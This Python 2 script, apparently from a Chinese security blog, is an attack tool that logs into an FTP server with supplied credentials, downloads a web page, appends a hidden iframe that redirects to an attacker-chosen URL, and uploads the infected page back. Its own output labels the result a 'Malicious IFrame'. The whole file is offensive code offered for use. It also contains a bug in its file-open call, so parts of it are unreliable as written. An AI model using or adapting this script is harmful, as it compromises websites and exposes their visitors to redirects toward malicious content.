#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -*- coding: gbk -*-
# Date: 2019/2/13
# Created by 冰河
# Description 感染FTP上的网页
#             流程为：
#                  1.创建FTP连接
#                  2.下载指定的网页
#                  3.在网页中加入重定向的iframe字符串
#                  4.上传被感染的网页
# 博客 https://blog.csdn.net/l1028386804

import ftplib

#感染网页
def injectPage(ftp, page, redirect):
    f = open(page + '.tmp' + 'w')
    ftp.retrlines('RETR ' + page, f.write)
    print '[+] Downloaded Page: ' + page
    f.write(redirect)
    f.close()
    print '[+] Injected Malicious IFrame on: ' + page

    ftp.storlines('STOR ' + page, open(page + '.tmp'))
    print '[+] Uploaded Injected Page: ' + page

#从命令行的输入获取参数
def main():
    host = raw_input('Please Input Hostname Or IP: ')
    while not host:
        host = raw_input('Please Input Hostname Or IP: ')

    username = raw_input('Please Input Username: ')
    while not username:
        username = raw_input('Please Input Username: ')

    password = raw_input('Please Input Password: ')
    while not password:
        password = raw_input('Please Input Password: ')

    webpage = raw_input('Please Input WebPage For Injecting: ')
    while not webpage:
        webpage = raw_input('Please Input WebPage For Injecting: ')

    url = raw_input('Please Input The Url Which Will Be Injected: ')
    while not url:
        url = raw_input('Please Input The Url Which Will Be Injected: ')

    ftp = ftplib.FTP(host)
    ftp.login(username, password)
    redirect = '<iframe src = "'+url+'"></iframe>'
    injectPage(ftp, webpage, redirect)

if __name__ == '__main__':
    main()